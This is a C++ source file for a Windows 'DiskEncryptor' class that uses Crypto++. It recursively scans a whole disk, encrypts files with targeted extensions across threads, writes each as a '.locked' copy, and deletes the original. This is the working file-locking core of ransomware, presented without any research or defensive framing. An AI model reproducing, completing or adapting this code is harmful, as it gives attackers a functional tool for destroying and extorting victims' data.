#include <iostream>
#include <Windows.h>
#include <filesystem>
#include <thread>

#include <cryptopp/filters.h>
#include <cryptopp/files.h>

#include "diskencryptor.h"

#define MAX_THREADS 3
#define FILE_EXTENSION ".locked"


bool DiskEncryptor::setDisk(std::string disk)
{
	_disk = disk;
	return true;
}

bool DiskEncryptor::setFreeSpace()
{
	DWORD _sectorsPerCluster, _bytesPerSector, _numberOfFreeClusters, _totalNumberOfClusters;
	if (GetDiskFreeSpaceA(_disk.c_str(), &_sectorsPerCluster, &_bytesPerSector, &_numberOfFreeClusters, &_totalNumberOfClusters))
	{
		_freespace = (_sectorsPerCluster * _bytesPerSector * _numberOfFreeClusters);
		return true;
	}
	return false;
}

bool DiskEncryptor::setEncryption(CryptoPP::SecByteBlock& key, CryptoPP::SecByteBlock& iv)
{
	_e.SetKeyWithIV(key.data(), key.size(), iv.data(), iv.size());
	return true;
}

void DiskEncryptor::iterateFiles() {
	std::cout << "Iterating files in disk: " << _disk << std::endl;
	std::vector<std::thread> threads;
	for (auto& entry : std::filesystem::recursive_directory_iterator(_disk, std::filesystem::directory_options::skip_permission_denied)) {
		try {
			if (entry.is_directory()) {
				
			}
			else {
				std::string ext = entry.path().extension().string();
				for (std::string e : ext2Ecrypt) {
					if (_freespace < entry.file_size()) {
						break;
					}
					if (ext == e) {
						if (threads.size() > MAX_THREADS) {
							for (std::thread& t : threads) {
								t.join();
							}
							threads.clear();
						}
						threads.push_back(std::thread(&DiskEncryptor::fileEncrypt, this, entry.path().string()));
					}

				}
			}
		}
		catch (std::exception e) {
			std::cout << e.what() << std::endl;
			continue;
	}
	
	}
	for (std::thread& t : threads) {
		t.join();
	
	}
}

std::string* DiskEncryptor::getDisk() {
	return &_disk;
}

bool DiskEncryptor::fileEncrypt(std::string file) {
	std::cout << "Encrypting file: " << file << std::endl;
	std::ifstream in(file, std::ios::binary);
	std::ofstream out(file + FILE_EXTENSION, std::ios::binary);
	CryptoPP::FileSource(in, true, new CryptoPP::StreamTransformationFilter(_e, new CryptoPP::FileSink(out)));
	in.close();
	out.close();
	std::filesystem::remove(file);
	return true;
}

DiskEncryptor::DiskEncryptor(std::string disk, CryptoPP::SecByteBlock& key, CryptoPP::SecByteBlock& iv)
{
	setDisk(disk);
	setFreeSpace();
	setEncryption(key, iv);
}

DiskEncryptor::~DiskEncryptor()
{

}